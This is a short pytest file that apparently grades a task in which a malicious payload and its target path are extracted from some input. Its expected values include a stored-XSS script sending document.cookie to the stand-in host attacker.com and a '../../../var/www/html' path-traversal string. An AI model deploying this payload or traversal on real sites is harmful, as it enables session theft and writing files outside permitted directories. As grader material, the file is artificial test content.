# test_final_state.py

import os
import pytest

def test_extracted_payload():
    path = "/home/user/extracted_payload.txt"
    assert os.path.isfile(path), f"File {path} does not exist. The payload was not extracted."

    with open(path, "r") as f:
        content = f.read()

    expected = "<html><body><script>fetch('http://attacker.com/steal?cookie='+document.cookie)</script></body></html>"
    assert content == expected, f"Content of {path} is incorrect. Expected: {expected}, Got: {content}"

def test_target_path():
    path = "/home/user/target_path.txt"
    assert os.path.isfile(path), f"File {path} does not exist. The malicious target path was not extracted."

    with open(path, "r") as f:
        content = f.read()

    expected = "../../../var/www/html/stored_xss.html"
    assert content == expected, f"Content of {path} is incorrect. Expected: {expected}, Got: {content}"